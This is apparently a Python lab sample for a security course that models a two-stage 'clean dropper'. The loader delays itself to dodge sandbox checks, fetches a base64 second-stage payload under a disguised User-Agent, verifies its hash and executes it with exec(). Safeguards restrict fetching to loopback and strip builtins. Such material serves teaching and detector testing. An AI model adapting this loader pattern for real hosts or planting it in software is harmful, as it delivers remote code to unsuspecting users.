#!/usr/bin/env python3
"""Educational Stage-1 'Clean Dropper' lab sample (PENT-15).

Models the 'clean loader -> deferred cloud stage-2 payload' architecture taught in
MYO062 (19.10 lecture: 'yeni nesil Truva ati: tertemiz gelir, zararli sonradan
buluttan iner').

Safety controls:
- Refuses any URL whose host is not loopback (127.0.0.1 / localhost / ::1).
- Executes the fetched stage-2 code only inside an isolated dictionary with empty
  __builtins__ when ``allow_exec=True``.
"""

from __future__ import annotations

import base64
import hashlib
import json
import time
import urllib.parse
import urllib.request
from typing import Any

try:
    from .stage2_server import assert_loopback_host
except ImportError:
    from stage2_server import assert_loopback_host  # type: ignore[no-redef]

DEFAULT_STAGE2_URL = "http://127.0.0.1:8765/stage2.json"


def assert_loopback_url(url: str) -> str:
    """Validate that a stage-2 URL targets loopback HTTP only."""
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError(f"Unsupported URL scheme {parsed.scheme!r}; expected http/https")
    assert_loopback_host(parsed.hostname or "")
    return url


def _wait_for_quiet_window(delay_sec: float = 0.01) -> float:
    """Simulated time-delayed staging gate (evasion of immediate install-time sandbox checks)."""
    bounded = max(0.0, min(float(delay_sec), 2.0))
    time.sleep(bounded)
    return bounded


def _fetch_remote_stage(
    stage2_url: str,
    timeout: float = 3.0,
    opener: Any = None,
) -> dict[str, Any]:
    """Fetch the stage-2 JSON envelope from the local loopback server."""
    assert_loopback_url(stage2_url)
    if opener is not None:
        return opener(stage2_url)
    req = urllib.request.Request(
        stage2_url,
        headers={"User-Agent": "ThemeSyncHelper/1.4 (os-lab-pent15)"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 (loopback-verified above)
        raw = resp.read(65536).decode("utf-8")
    return json.loads(raw)



def _decode_stage2_payload(packet: dict[str, Any]) -> str:
    """Decode and integrity-check the base64-encoded second-stage payload."""
    encoded = str(packet.get("payload_b64") or "")
    decoded_bytes = base64.b64decode(encoded.encode("ascii"))
    expected_hash = packet.get("sha256")
    actual_hash = hashlib.sha256(decoded_bytes).hexdigest()
    if expected_hash and expected_hash != actual_hash:
        raise ValueError("Stage-2 payload SHA-256 mismatch")
    return decoded_bytes.decode("utf-8")


def _activate_stage2(source_code: str, allow_exec: bool = True) -> dict[str, Any]:
    """Compile and dynamically execute the stage-2 code inside an isolated lab namespace."""
    sandbox_ns: dict[str, Any] = {"__builtins__": {}}
    compiled = compile(source_code, "<oslab-stage2-payload>", "exec")
    if allow_exec:
        exec(compiled, sandbox_ns, sandbox_ns)  # noqa: S102 (intentionally modeled sink for detector)
    return {
        "executed": bool(allow_exec),
        "marker": sandbox_ns.get("STAGE2_MARKER"),
        "status": sandbox_ns.get("STAGE2_STATUS"),
    }


def run_stage1(
    stage2_url: str = DEFAULT_STAGE2_URL,
    delay_sec: float = 0.01,
    allow_exec: bool = True,
    opener: Any = None,
) -> dict[str, Any]:
    """Run the full stage-1 loader lifecycle against a loopback stage-2 endpoint."""
    waited = _wait_for_quiet_window(delay_sec)
    packet = _fetch_remote_stage(stage2_url, opener=opener)
    decoded_code = _decode_stage2_payload(packet)
    activation = _activate_stage2(decoded_code, allow_exec=allow_exec)
    return {
        "loader": "stage1_clean_loader.py",
        "waited_sec": waited,
        "stage2_url": stage2_url,
        "payload_sha256": packet.get("sha256"),
        "decoded_length": len(decoded_code),
        "activation": activation,
    }
